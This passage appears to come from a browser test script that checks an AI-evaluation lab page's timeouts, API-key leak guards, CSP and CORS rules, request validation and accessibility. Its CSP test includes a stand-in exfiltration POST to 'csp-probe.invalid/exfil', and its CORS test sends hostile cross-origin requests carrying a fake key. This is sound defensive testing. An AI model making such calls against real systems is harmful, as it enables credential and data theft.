await step("G. L8 client waits 45 s, then times out", async () => {
  const t = await newLabPage({ clock: true });
  await t.page.goto(LAB, { waitUntil: "load" });
  await t.page.locator("input[name=response-source][value=live]").check();
  await t.page.locator("#lab-live-key").fill(ANT_KEY);
  t.cap.handler = () => ({ hang: true });
  await t.page.getByRole("button", { name: "Run baseline live" }).click();
  for (let i = 0; i < 100 && t.cap.api.length < 2; i++) await sleep(50);
  await t.page.clock.runFor(44_000);
  await sleep(200);
  const mid = await t.page.evaluate(() => ({ cancel: [...document.querySelectorAll("button")].some((b) => b.textContent?.trim() === "Cancel"), status: [...document.querySelectorAll("[role=status]")].map((s) => s.textContent).join("|") }));
  check("L8 at 44 s the live run is still waiting (Cancel shown, Running…)", mid.cancel && mid.status.includes("Running"), JSON.stringify(mid));
  await t.page.clock.runFor(1_500);
  await t.page.waitForFunction(() => [...document.querySelectorAll("[role=status]")].some((s) => /Run 1 complete/.test(s.textContent ?? "")), null, { timeout: 10000 });
  const alerts = await editAlerts(t.page);
  check("L8 after 45 s: 'Run 1: Live request timed out — not evaluated' (run 1 is on screen)", (await shownRunLabel(t.page)) === "Run 1" && alerts.length === 1 && alerts[0] === "Run 1: Live request timed out — not evaluated", JSON.stringify(alerts));
  const failed = t.cap.failed.filter((f) => f.url.includes("/api/lab/run"));
  check("L8 the client timeout aborts both requests", failed.length === 2, JSON.stringify(failed));
  await t.cap.context.close();
});

// =====================================================================================
// H. Key-in-instruction (separate page, so the main page's React state never held the key)
// =====================================================================================
await step("H. a run is blocked when the instruction contains the key", async () => {
  const t = await newLabPage();
  await t.page.goto(LAB, { waitUntil: "networkidle" });
  await t.page.locator("input[name=response-source][value=live]").check();
  await t.page.locator("#lab-live-key").fill(ANT_KEY);
  await t.page.locator("#lab-instruction").fill(`Use this: ${ANT_KEY}`);
  await t.page.getByRole("button", { name: "Rerun", exact: true }).click();
  await sleep(500);
  const alerts = await editAlerts(t.page);
  check("L4 instruction containing the key: blocked with a fixed alert, no request", t.cap.api.length === 0 && alerts.some((a) => a === `${MSG.keyInInstruction}.`), JSON.stringify(alerts));
  await t.cap.context.close();
});

// =====================================================================================
// I. CSP after client-side navigation (D32), and response headers
// =====================================================================================
await step("I. CSP connect-src in force after client-side navigation from / to /lab", async () => {
  const t = await newLabPage();
  const docHeaders = [];
  t.page.on("response", async (r) => {
    if (r.request().resourceType() === "document") docHeaders.push({ url: r.url(), csp: (await r.allHeaders())["content-security-policy"] ?? null, powered: (await r.allHeaders())["x-powered-by"] ?? null });
  });
  let probeHit = 0;
  await t.page.route("**/csp-probe.invalid/**", (route) => {
    probeHit += 1;
    return route.abort("failed");
  });
  await t.page.goto(`${ORIGIN}/`, { waitUntil: "networkidle" });
  await t.page.locator('nav a[href="/lab"]').first().click();
  await t.page.waitForURL("**/lab");
  await t.page.locator("#lab-instruction").waitFor();
  const docs = docHeaders.map((d) => d.url);
  check("CSP the /lab page was reached by client-side navigation (only one document load)", docs.length === 1 && docs[0] === `${ORIGIN}/`, JSON.stringify(docs));
  const probe = await t.page.evaluate(async () => {
    const violations = [];
    document.addEventListener("securitypolicyviolation", (e) => violations.push({ directive: e.violatedDirective, blocked: e.blockedURI }));
    let error = null;
    try {
      await fetch("https://csp-probe.invalid/exfil", { method: "POST", body: "x", mode: "no-cors" });
    } catch (e) {
      error = String(e);
    }
    await new Promise((r) => setTimeout(r, 300));
    return { error, violations };
  });
  check("CSP a cross-origin fetch from /lab after client-side navigation is blocked", !!probe.error && probeHit === 0, JSON.stringify({ ...probe, probeHit }));
  check("CSP the block is a connect-src violation", probe.violations.some((v) => /connect-src/.test(v.directive)), JSON.stringify(probe.violations));
  const home = docHeaders[0];
  check("CSP the home document already carries connect-src 'self' (one site-wide policy)", !!home?.csp && /connect-src 'self'/.test(home.csp) && !home.csp.includes(","), home?.csp ?? "(none)");
  check("HEADERS no X-Powered-By on pages", docHeaders.every((d) => d.powered === null), JSON.stringify(docHeaders.map((d) => d.powered)));
  await t.cap.context.close();
});

// =====================================================================================
// J. Server-side checks against the real `next start` route (no provider is reachable)
// =====================================================================================
await step("J. real route: request checks, headers, and no key in replies", async () => {
  const url = `${ORIGIN}/api/lab/run`;
  const valid = { scenarioId: "spouse-parity", scenarioVersion: "1", variant: "a", instruction: "Be brief.", provider: "anthropic", model: "claude-haiku-4-5" };
  const auth = { authorization: `Bearer ${ANT_KEY}` };
  const json = { "content-type": "application/json" };
  const cases = [
    ["GET → 405", { method: "GET", headers: auth }, 405, "Method not allowed"],
    ["PUT → 405", { method: "PUT", headers: { ...json, ...auth }, body: JSON.stringify(valid) }, 405, "Method not allowed"],
    ["PATCH → 405", { method: "PATCH", headers: { ...json, ...auth }, body: JSON.stringify(valid) }, 405, "Method not allowed"],
    ["DELETE → 405", { method: "DELETE", headers: auth }, 405, "Method not allowed"],
    ["text/plain → 415", { method: "POST", headers: { "content-type": "text/plain", ...auth }, body: JSON.stringify(valid) }, 415, "Content type must be application/json"],
    ["oversized body (over 32 KiB) → 413", { method: "POST", headers: { ...json, ...auth }, body: JSON.stringify({ ...valid, pad: "p".repeat(33000) }) }, 413, "Request body too large"],
    // D39: the worst-case valid instruction (4000 × U+0001, ~24 KB of JSON) passes the size and schema checks and is
    // stopped only by the later key/provider check (so nothing is sent anywhere); 4001 of them fail the schema check.
    ["4000 × U+0001 passes the size check (then key/provider mismatch → 400)", { method: "POST", headers: { ...json, authorization: `Bearer ${OAI_KEY}` }, body: JSON.stringify({ ...valid, instruction: "\u0001".repeat(4000) }) }, 400, MSG.badProvider],
    ["4001 × U+0001 → schema 400", { method: "POST", headers: { ...json, ...auth }, body: JSON.stringify({ ...valid, instruction: "\u0001".repeat(4001) }) }, 400, "Instruction must be text of at most 4000 characters"],
    ["bad JSON → 400", { method: "POST", headers: { ...json, ...auth }, body: "{" }, 400, "Request body is not valid JSON"],
    ["stale scenario version → 409", { method: "POST", headers: { ...json, ...auth }, body: JSON.stringify({ ...valid, scenarioId: "stated-identity", scenarioVersion: "1" }) }, 409, "Scenario version mismatch — reload the page"],
    ["deferred model → 400", { method: "POST", headers: { ...json, ...auth }, body: JSON.stringify({ ...valid, model: "claude-opus-5-5" }) }, 400, "Unknown provider or model"],
    ["malformed key → 400", { method: "POST", headers: { ...json, authorization: `Bearer ${ANT_KEY} x` }, body: JSON.stringify(valid) }, 400, MSG.routeKey],
    ["key/provider mismatch → 400", { method: "POST", headers: { ...json, authorization: `Bearer ${OAI_KEY}` }, body: JSON.stringify(valid) }, 400, MSG.badProvider],
    ["key in instruction → 400", { method: "POST", headers: { ...json, ...auth }, body: JSON.stringify({ ...valid, instruction: `x ${ANT_KEY}` }) }, 400, MSG.keyInInstruction],
  ];
  for (const [name, init, code, message] of cases) {
    const res = await fetch(url, init);
    const text = await res.text();
    let body = null;
    try {
      body = JSON.parse(text);
    } catch {}
    check(`ROUTE ${name}: fixed JSON reply`, res.status === code && body?.message === message && body?.status === "model_error" && Object.keys(body).length === 2, `${res.status} ${text.slice(0, 120)}`);
    if (code === 405) check(`ROUTE ${name}: Allow: POST, OPTIONS`, res.headers.get("allow") === "POST, OPTIONS", res.headers.get("allow"));
    check(`ROUTE ${name}: no-store, no CORS, no X-Powered-By, no key`, res.headers.get("cache-control") === "no-store" && res.headers.get("access-control-allow-origin") === null && res.headers.get("x-powered-by") === null && !leaksKey(text) && !leaksKey([...res.headers].join("\n")), [...res.headers].map((h) => h.join(": ")).join("; ").slice(0, 300));
  }
  const opt = await fetch(url, { method: "OPTIONS", headers: { origin: "https://evil.example", "access-control-request-method": "POST", "access-control-request-headers": "authorization,content-type" } });
  const acHeaders = [...opt.headers.keys()].filter((k) => k.startsWith("access-control-"));
  check("ROUTE OPTIONS preflight from another origin: 204, Allow: POST, OPTIONS, no-store, no Access-Control-* headers", opt.status === 204 && opt.headers.get("allow") === "POST, OPTIONS" && opt.headers.get("cache-control") === "no-store" && acHeaders.length === 0 && (await opt.text()) === "", JSON.stringify({ status: opt.status, allow: opt.headers.get("allow"), cc: opt.headers.get("cache-control"), acHeaders }));
  // A page on another (loopback) origin cannot call the route with a key: the browser's preflight gets no CORS grant.
  const xoCtx = await browser.newContext();
  const xoPage = await xoCtx.newPage();
  const xoConsole = [];
  xoPage.on("console", (m) => xoConsole.push(m.text()));
  // A real loopback server for the other origin (an intercepted page has an unknown address space,
  // which Chromium's local-network check would block for a different reason).
  const http = await import("node:http");
  const other = http.createServer((_req, res) => {
    res.writeHead(200, { "content-type": "text/html" });
    res.end("<!doctype html><title>other origin</title>");
  });
  await new Promise((r) => other.listen(39998, "127.0.0.1", r));
  await xoPage.goto("http://127.0.0.1:39998/");
  const xoResult = await xoPage.evaluate(async (u) => {
    try {
      const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json", authorization: "Bearer sk-ant-test-VerifierFakeKeyNotRealAbcdefghij" }, body: "{}" });
      return `status ${r.status}`;
    } catch (e) {
      return `blocked: ${String(e)}`;
    }
  }, url);
  await sleep(300);
  const corsMsg = xoConsole.find((m) => /blocked by CORS policy/.test(m)) ?? "";
  check("ROUTE a page on another origin cannot call the route with a key (blocked by CORS: no grant on the preflight)", xoResult.startsWith("blocked") && /preflight|Access-Control-Allow-Origin/.test(corsMsg), `${xoResult} | ${corsMsg.slice(0, 200)}`);
  await xoCtx.close();
  other.close();
  const lab = await fetch(LAB);
  const csp = lab.headers.get("content-security-policy") ?? "";
  check("HEADERS /lab: exactly one CSP with connect-src 'self', frame-ancestors 'none'; nosniff; no X-Powered-By", /connect-src 'self'/.test(csp) && /frame-ancestors 'none'/.test(csp) && !csp.includes(",") && lab.headers.get("x-content-type-options") === "nosniff" && lab.headers.get("x-powered-by") === null, csp);
});

await step("J. real route: a valid request goes only to the fixed provider host (fake proxy; nothing leaves the machine)", async () => {
  if (!PROXY_PORT) {
    observe("FAKE_PROXY_PORT not set: skipped the outbound-destination check for valid requests.");
    return;
  }
  const url = `${ORIGIN}/api/lab/run`;
  for (const [provider, model, key, host] of [
    ["anthropic", "claude-haiku-4-5", ANT_KEY, "api.anthropic.com:443"],
    ["openai", "gpt-4o-mini", OAI_KEY, "api.openai.com:443"],
  ]) {
    proxyLog.length = 0;
    const res = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${key}` },
      body: JSON.stringify({ scenarioId: "disclosure-boundary", scenarioVersion: "2", variant: "b", instruction: "Summarize.", provider, model, input: "CLIENT-INPUT" }),
    });
    const text = await res.text();
    const connects = proxyLog.map((l) => l.split("\r\n")[0]);
    check(`ROUTE valid ${provider} request: exactly one outbound CONNECT, to ${host}`, connects.length === 1 && connects[0] === `CONNECT ${host} HTTP/1.1`, JSON.stringify(connects));
    check(`ROUTE valid ${provider} request: the key is not in the clear-text proxy handshake`, proxyLog.every((l) => !leaksKey(l)));
    check(`ROUTE valid ${provider} request: unreachable provider → fixed 'Provider unavailable', no key`, res.status === 200 && JSON.parse(text).status === "model_error" && JSON.parse(text).error === MSG.unavailable && !leaksKey(text), text.slice(0, 160));
  }
});

// =====================================================================================
// K. D30 accessibility: scroll regions, focus not obscured, reflow; axe parity
// =====================================================================================
await step("K. D30 scrollable regions are keyboard-focusable and keyboard-scrollable", async () => {
  const t = await newLabPage({ viewport: { width: 320, height: 800 } });
  await t.page.goto(LAB, { waitUntil: "networkidle" });
  await t.page.locator("input[name=response-source][value=live]").check();
  await t.page.locator("#lab-live-key").fill(ANT_KEY);
  await t.page.getByRole("button", { name: "Run baseline live" }).click();
  await waitRun(t.page, 1);
  await t.page.getByRole("button", { name: /FIX-VERIFY/ }).click();
  await t.page.getByRole("button", { name: "Rerun", exact: true }).click();
  await waitRun(t.page, 2);
  // Every element that actually scrolls must be focusable or contain something focusable.
  const scrollers = await t.page.evaluate(() => {
    const out = [];
    for (const el of document.querySelectorAll("body *")) {
      const cs = getComputedStyle(el);
      const sx = /(auto|scroll)/.test(cs.overflowX) && el.scrollWidth > el.clientWidth + 1;
      const sy = /(auto|scroll)/.test(cs.overflowY) && el.scrollHeight > el.clientHeight + 1;
      if (!sx && !sy) continue;
      const focusable = el.tabIndex >= 0 || !!el.querySelector("a[href],button,input,select,textarea,[tabindex]:not([tabindex='-1'])");
      out.push({ label: el.getAttribute("aria-label") ?? el.tagName, role: el.getAttribute("role"), tabindex: el.getAttribute("tabindex"), focusable });
    }
    return out;
  });
  check("D30 at 320 px every scrolling region is keyboard-reachable (WCAG 2.1.1)", scrollers.length >= 2 && scrollers.every((s) => s.focusable), JSON.stringify(scrollers));
  const regions = ["Simulator snippet rules table", "Simulator failure modes table", "Comparison table"];
  for (const name of regions) {
    const reg = t.page.locator(`[role=region][aria-label="${name}"]`);
    if ((await reg.count()) === 0) {
      check(`D30 region '${name}' exists`, false);
      continue;
    }
    await t.page.keyboard.press("Tab");
    // Reach it with Tab only.
    let reached = false;
    for (let i = 0; i < 300; i++) {
      if (await reg.evaluate((el) => el === document.activeElement)) {
        reached = true;
        break;
      }
      await t.page.keyboard.press("Tab");
    }
    const info = await reg.evaluate((el) => {
      const cs = getComputedStyle(el);
      return { focusVisible: el.matches(":focus-visible"), outline: `${cs.outlineStyle} ${cs.outlineWidth}`, overflow: el.scrollWidth > el.clientWidth, left: el.scrollLeft };
    });
    check(`D30 '${name}' is reached with Tab and shows a visible focus outline`, reached && info.focusVisible && !info.outline.startsWith("none") && !info.outline.endsWith(" 0px"), JSON.stringify(info));
    if (info.overflow) {
      await t.page.keyboard.press("ArrowRight");
      await t.page.keyboard.press("ArrowRight");
      await sleep(150);
      const left = await reg.evaluate((el) => el.scrollLeft);
      check(`D30 '${name}' scrolls horizontally with the arrow keys at 320 px`, left > 0, String(left));
    } else observe(`'${name}' does not overflow at 320 px`);
  }
  await t.cap.context.close();
});

async function obscuredSweep(p, label) {
  const res = { forward: [], backward: [] };
  for (const dir of ["forward", "backward"]) {
    await p.evaluate((d) => {
      if (d === "forward") window.scrollTo(0, 0);
      else window.scrollTo(0, document.documentElement.scrollHeight);
      document.activeElement?.blur?.();
    }, dir);
    if (dir === "backward") {
      // Start from the end of the page.
      await p.locator("footer").first().evaluate((el) => {
        el.setAttribute("tabindex", "-1");
        el.focus();
        el.removeAttribute("tabindex");
      });
    }
    const seenEls = new Set();
    for (let i = 0; i < 400; i++) {
      await p.keyboard.press(dir === "forward" ? "Tab" : "Shift+Tab");
      const info = await p.evaluate(() => {
        const el = document.activeElement;
        if (!el || el === document.body) return null;
        const nav = document.querySelector("body > nav");
        const nr = nav.getBoundingClientRect();
        const r = el.getBoundingClientRect();
        const id = el.id || `${el.tagName}:${(el.textContent ?? "").trim().slice(0, 40)}:${Math.round(r.top + window.scrollY)}`;
        const inNav = nav.contains(el);
        const visibleTop = Math.max(r.top, inNav ? 0 : nr.bottom);
        const visibleBottom = Math.min(r.bottom, window.innerHeight);
        return { id, inNav, top: Math.round(r.top), bottom: Math.round(r.bottom), navBottom: Math.round(nr.bottom), hidden: !inNav && visibleBottom <= visibleTop, partly: !inNav && r.top < nr.bottom && r.bottom > nr.bottom, w: r.width, h: r.height };
      });
      if (!info) continue;
      if (seenEls.has(info.id)) break;
      seenEls.add(info.id);
      if (info.w === 0 && info.h === 0) continue;
      res[dir].push(info);
    }
  }
  const hidden = [...res.forward, ...res.backward].filter((x) => x.hidden);
  const partly = [...res.forward, ...res.backward].filter((x) => x.partly);
  check(`D30 ${label}: no focused element is entirely hidden by the sticky nav (Tab ${res.forward.length} stops, Shift+Tab ${res.backward.length} stops)`, res.forward.length > 20 && res.backward.length > 20 && hidden.length === 0, JSON.stringify(hidden.slice(0, 5)));
  if (partly.length) observe(`${label}: ${partly.length} focus stops partly under the nav (allowed by SC 2.4.11, not by 2.4.12): ${JSON.stringify(partly.slice(0, 3))}`);
}

await step("K. D30 focus not obscured by the sticky nav (SC 2.4.11), Tab and Shift+Tab", async () => {
  for (const vp of [{ width: 1280, height: 900 }, { width: 320, height: 640 }]) {
    const t = await newLabPage({ viewport: vp });
    await t.page.goto(LAB, { waitUntil: "networkidle" });
    await obscuredSweep(t.page, `${vp.width}px simulated`);
    await t.page.locator("input[name=response-source][value=live]").check();
    await t.page.locator("#lab-live-key").fill(ANT_KEY);
    await t.page.getByRole("button", { name: "Run baseline live" }).click();
    await waitRun(t.page, 1);
    await t.page.getByRole("button", { name: /FIX-VERIFY/ }).click();
    await t.page.getByRole("button", { name: "Rerun", exact: true }).click();
    await waitRun(t.page, 2);
    await obscuredSweep(t.page, `${vp.width}px live with comparison`);
    await t.cap.context.close();
  }
});

await step("K. D30 reflow: no horizontal page scroll at 320 px and 375 px", async () => {
  for (const width of [320, 375]) {
    const t = await newLabPage({ viewport: { width, height: 800 } });
    await t.page.goto(LAB, { waitUntil: "networkidle" });
    const measure = () => t.page.evaluate(() => ({ doc: document.documentElement.scrollWidth, body: document.body.scrollWidth, inner: window.innerWidth }));
    const ok = (m) => m.doc <= m.inner && m.body <= m.inner;
    let m = await measure();
    check(`D30 ${width}px simulated: no horizontal scroll`, ok(m), JSON.stringify(m));
    await t.page.locator("input[name=response-source][value=live]").check();
    await t.page.locator("#lab-live-key").fill(ANT_KEY);
    await t.page.getByRole("button", { name: /^(Show|Hide) key$/ }).click();
    m = await measure();
    check(`D30 ${width}px live panel (key shown): no horizontal scroll`, ok(m), JSON.stringify(m));
    await t.page.getByRole("button", { name: "Run baseline live" }).click();
    await waitRun(t.page, 1);
    t.cap.handler = okHandler({ returned: { a: "claude-haiku-4-5-20251001-with-an-unusually-long-returned-model-identifier", b: "claude-haiku-4-5-20260101-and-another-long-identifier" } });
    await t.page.getByRole("button", { name: "Rerun", exact: true }).click();
    await waitRun(t.page, 2);
    m = await measure();
    check(`D30 ${width}px live run with long returned model ids and the compare view: no horizontal scroll`, ok(m), JSON.stringify(m));
    // Worst case for the banner: a 100-character returned model id with no break opportunities (the client keeps ids up to 100).
    const ID100 = "claudehaiku45" + "x".repeat(87);
    t.cap.handler = okHandler({ returned: { a: ID100, b: ID100 } });
    await t.page.getByRole("button", { name: "Rerun", exact: true }).click();
    await waitRun(t.page, 3);
    const bannerBox = await t.page.locator("[role=note] p").first().evaluate((el) => ({
      text: el.textContent ?? "",
      wrap: getComputedStyle(el).overflowWrap,
      fits: el.scrollWidth <= el.clientWidth && el.getBoundingClientRect().right <= window.innerWidth,
    }));
    m = await measure();
    check(`ITEM7 ${width}px banner with a 100-character returned model id: id shown, wraps (overflow-wrap:anywhere), no horizontal scroll`, bannerBox.text.includes(ID100) && bannerBox.wrap === "anywhere" && bannerBox.fits && ok(m), JSON.stringify({ wrap: bannerBox.wrap, fits: bannerBox.fits, ...m }));
    t.cap.handler = () => ({ body: { status: "model_error", error: MSG.tokenLimit, durationMs: 1 } });
    await t.page.getByRole("button", { name: "Rerun", exact: true }).click();
    await waitRun(t.page, 4);
    m = await measure();
    check(`D30 ${width}px live error alert: no horizontal scroll`, ok(m), JSON.stringify(m));
    await t.page.screenshot({ path: join(EVIDENCE, `verifier-live-reflow-${width}.png`), fullPage: true });
    await t.cap.context.close();
  }
});

await step("K. ITEM8 /lab form-field borders reach 3:1 against what surrounds them (WCAG 1.4.11)", async () => {
  const t = await newLabPage();
  await t.page.goto(LAB, { waitUntil: "networkidle" });
  // Open an override form so its reason textarea is measured too.
  await t.page.locator("section[aria-labelledby=findings] button:not([disabled])", { hasText: "Disagree with this result" }).first().click();
  const measureFields = () => t.page.evaluate(() => {
    const canvas = document.createElement("canvas");
    canvas.width = canvas.height = 1;
    const ctx = canvas.getContext("2d", { willReadFrequently: true });
    const paint = (layers) => {
      ctx.clearRect(0, 0, 1, 1);
      ctx.fillStyle = "#ffffff";
      ctx.fillRect(0, 0, 1, 1);
      for (const c of layers) {
        ctx.fillStyle = "#000000";
        ctx.fillStyle = c;
        ctx.fillRect(0, 0, 1, 1);
      }
      const [r, g, b] = ctx.getImageData(0, 0, 1, 1).data;
      return [r, g, b];
    };
    const lum = ([r, g, b]) => {
      const f = (v) => {
        v /= 255;
        return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4;
      };
      return 0.2126 * f(r) + 0.7152 * f(g) + 0.0722 * f(b);
    };
    const ratio = (x, y) => {
      const [a, b] = [lum(x), lum(y)].sort((p, q) => q - p);
      return (a + 0.05) / (b + 0.05);
    };
    const out = [];
    const main = document.querySelector("main");
    for (const el of main.querySelectorAll("input:not([type=radio]):not([type=checkbox]), select, textarea")) {
      if (el.disabled) continue;
      const chain = [];
      for (let n = el.parentElement; n; n = n.parentElement) chain.unshift(getComputedStyle(n).backgroundColor);
      const around = paint(chain.filter((c) => c && c !== "rgba(0, 0, 0, 0)" && c !== "transparent"));
      const cs = getComputedStyle(el);
      const border = paint([...chain.filter((c) => c && c !== "rgba(0, 0, 0, 0)" && c !== "transparent"), cs.borderTopColor]);
      out.push({ id: el.id || el.tagName.toLowerCase(), width: cs.borderTopWidth, border: cs.borderTopColor, ratio: Math.round(ratio(border, around) * 100) / 100 });
    }
    // Sanity: the converter must see the real colors (Tailwind 4 uses oklch), not a fallback.
    const probe = paint(["oklch(0.552 0.016 285.938)"]);
    return { out, probe };
  });
  const sim = await measureFields();
  await t.page.locator("input[name=response-source][value=live]").check();
  const live = await measureFields();
  const byId = new Map([...sim.out, ...live.out].map((f) => [f.id, f]));
  const fields = [...byId.values()];
  check("ITEM8 color conversion sanity (zinc-500 oklch → about rgb(113,113,123))", Math.abs(sim.probe[0] - 113) <= 3 && Math.abs(sim.probe[2] - 123) <= 3, JSON.stringify(sim.probe));
  const low = fields.filter((f) => f.ratio < 3 || f.width === "0px");
  check(`ITEM8 every enabled /lab text field, select, and textarea has a visible border at ≥ 3:1 (${fields.length} measured)`, fields.length >= 6 && low.length === 0, JSON.stringify(fields));
  await t.cap.context.close();
});

await step("K. ITEM9 leaving /lab by client-side navigation aborts both in-flight live calls", async () => {
  const t = await newLabPage();
  await t.page.goto(LAB, { waitUntil: "networkidle" });
  await t.page.locator("input[name=response-source][value=live]").check();
  await t.page.locator("#lab-live-key").fill(ANT_KEY);
  t.cap.handler = () => ({ hang: true });
  await t.page.getByRole("button", { name: "Run baseline live" }).click();
  for (let i = 0; i < 100 && t.cap.api.length < 2; i++) await sleep(50);
  const docsBefore = t.cap.requests.filter((r) => r.url === `${ORIGIN}/tools` && r.method === "GET").length;
  await t.page.locator('nav a[href="/tools"]').first().click();
  await t.page.waitForURL("**/tools");
  await sleep(500);
  const aborted = t.cap.failed.filter((f) => f.url.includes("/api/lab/run"));
  const navEntries = await t.page.evaluate(() => performance.getEntriesByType("navigation").length);
  check("ITEM9 both calls were in flight", t.cap.api.length === 2, String(t.cap.api.length));
  check("ITEM9 client-side navigation away from /lab aborts both requests", aborted.length === 2 && aborted.every((f) => /ABORTED/.test(f.error)), JSON.stringify(aborted));
  const docsAfter = t.cap.requests.filter((r) => r.url === `${ORIGIN}/tools` && r.method === "GET").length;
  check("ITEM9 the navigation was client-side (no new document load), so the abort comes from the lab unmounting", navEntries === 1 && docsAfter === docsBefore, JSON.stringify({ navEntries, docsBefore, docsAfter }));
  await t.cap.context.close();
});

await step("K. ITEM10 a run that finishes while another scenario is displayed names its scenario", async () => {
  const t = await newLabPage();
  await t.page.goto(LAB, { waitUntil: "networkidle" });
  await t.page.locator("input[name=response-source][value=live]").check();
  await t.page.locator("#lab-live-key").fill(ANT_KEY);
  t.cap.handler = okHandler({ delay: 1500 });
  await t.page.getByRole("button", { name: "Run baseline live" }).click();
  await sleep(300);
  await t.page.locator("input[name=scenario][value=stated-identity]").check();
  await t.page.waitForFunction(() => [...document.querySelectorAll("[role=status]")].some((s) => /Run 1 complete/.test(s.textContent ?? "")), null, { timeout: 15000 });
  const st = (await statusTexts(t.page)).join(" | ");
  check("ITEM10 announcement: 'Run 1 complete for Equal help for a same-sex spouse: …'", /Run 1 complete for Equal help for a same-sex spouse: /.test(st), st);
  // Same scenario on screen → no scenario name.
  await t.page.locator("input[name=scenario][value=spouse-parity]").check();
  await t.page.getByRole("button", { name: "Run baseline live" }).click();
  await t.page.waitForFunction(() => [...document.querySelectorAll("[role=status]")].some((s) => /Run 2 complete/.test(s.textContent ?? "")), null, { timeout: 15000 });
  const st2 = (await statusTexts(t.page)).join(" | ");
  check("ITEM10 a run that finishes on its own scenario: 'Run 2 complete: …' (no scenario name)", /Run 2 complete: /.test(st2) && !/complete for/.test(st2), st2);
  await t.cap.context.close();
});

await step("K. L7 accessibility parity: live mode adds no axe violation types", async () => {
  if (!axeSource) {
    observe("AXE_PATH not set: skipped the axe parity scan.");
    return;
  }
  const t = await newLabPage();
  await t.page.goto(LAB, { waitUntil: "networkidle" });
  const sim = simAxe ?? (await axeScan(t.page, "simulated mode, initial"));
  await t.page.locator("input[name=response-source][value=live]").check();
  const panel = await axeScan(t.page, "live mode, panel");
  await t.page.locator("#lab-live-key").fill("");
  await t.page.getByRole("button", { name: "Run baseline live" }).click();
  const keyErr = await axeScan(t.page, "live mode, missing-key error");
  await t.page.locator("#lab-live-key").fill(ANT_KEY);
  await t.page.getByRole("button", { name: "Run baseline live" }).click();
  await waitRun(t.page, 1);
  await t.page.getByRole("button", { name: /FIX-VERIFY/ }).click();
  await t.page.getByRole("button", { name: "Rerun", exact: true }).click();
  await waitRun(t.page, 2);
  const run = await axeScan(t.page, "live mode, live run with comparison");
  t.cap.handler = () => ({ body: { status: "provider_refused", error: MSG.refused, durationMs: 1 } });
  await t.page.getByRole("button", { name: "Rerun", exact: true }).click();
  await waitRun(t.page, 3);
  const err = await axeScan(t.page, "live mode, error alert");
  const base = new Set(sim.map((v) => v.id));
  const added = [...panel, ...keyErr, ...run, ...err].map((v) => v.id).filter((id) => !base.has(id));
  check("L7 live-mode states add no axe violation types beyond the simulated page", added.length === 0, [...new Set(added)].join(", "));
  // The only known violation (D31, follow-up) is the footer's contrast; nothing inside the lab, including the U1 note and U2 help.
  const inLab = [...sim, ...panel, ...keyErr, ...run, ...err].flatMap((v) => v.targets.filter((t) => !t.startsWith("footer")).map((t) => `${v.id}: ${t}`));
  check("L7/U1/U2 axe finds no violation inside the lab in any state", inLab.length === 0, inLab.join(" | "));
  const anywhere = [...sim, ...panel, ...keyErr, ...run, ...err].map((v) => `${v.id}×${v.nodes}`);
  check("F5 axe finds no violation anywhere on /lab in any state (the D31 footer contrast is fixed)", anywhere.length === 0, anywhere.join(" | "));
  await t.cap.context.close();
});

// =====================================================================================
// Wrap-up: console, page errors, server output
// =====================================================================================
check("L4 no page errors during the main session", main.cap.pageErrors.length === 0, main.cap.pageErrors.join(" | "));
const jsErrors = main.cap.console.filter((m) => m.startsWith("error:") && !/Failed to load resource|net::ERR_|status of (4|5)\d\d/i.test(m));
check("no JS console errors in the main session (failed-resource messages from injected HTTP errors excluded)", jsErrors.length === 0, jsErrors.join(" | "));
check("L4 the key never reached the console (main session)", !main.cap.console.some(leaksKey));
if (SERVER_LOG && existsSync(SERVER_LOG)) {
  const log = readFileSync(SERVER_LOG, "utf8");
  check("L4 `next start` output contains no part of either key", !leaksKey(log), `${log.length} bytes of server output`);
  check("L4 `next start` output contains no stack traces or provider error text", !/at .*\(.*\.js:\d+|AuthenticationError|APIError|invalid x-api-key/i.test(log), log.slice(-300));
} else observe("SERVER_LOG not set: skipped the server-output check.");

await main.cap.context.close();
await browser.close();
if (proxyServer) proxyServer.close();
const failed = results.filter((r) => !r.ok);
console.log(`\nSUMMARY: ${results.length - failed.length}/${results.length} checks passed; ${failed.length} failed.`);
for (const f of failed) console.log(`  FAILED: ${f.name}  [${String(f.detail).slice(0, 300)}]`);
for (const o of observations) console.log(`  NOTE: ${o}`);
process.exit(failed.length > 0 ? 1 : 0);
